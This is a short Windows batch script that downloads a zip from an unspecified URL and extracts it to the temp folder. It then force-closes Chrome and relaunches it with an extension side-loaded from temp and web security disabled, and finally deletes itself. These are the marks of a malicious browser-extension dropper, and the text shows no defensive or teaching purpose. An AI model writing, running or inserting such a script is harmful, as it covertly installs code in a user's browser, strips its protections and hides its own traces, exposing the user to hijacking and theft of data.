@echo off
set URL=

curl -o "%temp%\download-test.zip" %URL%
"C:\Program Files\7-Zip\7z.exe" x "%temp%\download-test.zip" -o"%temp%" -y
del "%temp%\download-test.zip"
taskkill /IM chrome.exe /F
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" "--load-extension=%temp%/chrome_extensions_82379" "--disable-web-security"
del %0